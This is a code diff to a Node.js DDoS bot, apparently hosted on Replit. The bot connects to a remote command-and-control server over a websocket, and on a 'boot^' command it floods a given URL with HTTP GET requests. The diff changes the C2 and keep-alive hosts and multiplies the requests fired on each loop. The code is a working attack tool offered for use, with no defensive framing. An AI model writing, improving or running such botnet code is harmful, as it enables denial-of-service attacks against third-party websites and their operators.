@@ -12,7 +12,7 @@ app.get("/", async (req, res) => {
   res.end(`<h1 style="font-size:10vw">${e}</h1>`)
 })
 
-const socket = io("wss://v3.hackballshd.repl.co", {
+const socket = io("wss://server.iep0kjum6sity5e.repl.co", {
   reconnection: true,
   reconnectionAttempts: 10000,
   reconnectionDelay: 6000,
@@ -22,14 +22,17 @@ const socket = io("wss://v3.hackballshd.repl.co", {
 
 socket.on('message', async m => {
   console.log(m)
-  if (m.substr(0, "boot^".length) == "boot^") {
+  if (m.substr(0, 5) == "boot^") {
     var args = m.split('^').slice(1)
     var u = args[0]
     var p = args[1]
     console.log("Booting: " + u + " with power: " + p)
     for (i = p; i > 0; i--) {
-      var a = axios.get(u)
-      .catch(err =>{console.log("maybe its down or we got ip banned lol.")})
+      axios.get(u).catch(err =>{console.log("maybe its down or we got ip banned lol.")})
+      axios.get(u).catch(err =>{console.log("maybe its down or we got ip banned lol.")})
+      axios.get(u).catch(err =>{console.log("maybe its down or we got ip banned lol.")})
+      axios.get(u).catch(err =>{console.log("maybe its down or we got ip banned lol.")})
+      axios.get(u).catch(err =>{console.log("maybe its down or we got ip banned lol.")})
       console.log(i)
     }
   }
@@ -40,14 +43,14 @@ socket.on('connect', function() {
 function reconnect() {
   socket = null;
   console.log("reconnecting lol")
-  var socket = io("wss://v3.hackballshd.repl.co", {
+  var socket = io("wss://server.iep0kjum6sity5e.repl.co", {
   reconnectionDelayMax: 30000,
   // keep this
   });
 }
 socket.on('disconnect', () => {setTimeout(()=>{console.log("r")},6000)})
 async function cringe() {
-  await axios.get("https://pinggg.hackballshd.repl.co/add?url=https://"+process.env.REPL_SLUG+"."+process.env.REPL_OWNER+".repl.co")
+  await axios.get("https://ping.iEp0KJuM6sitY5e.repl.co/add?url=https://"+process.env.REPL_SLUG+"."+process.env.REPL_OWNER+".repl.co")
   console.log("ADDED")
 }
 cringe()
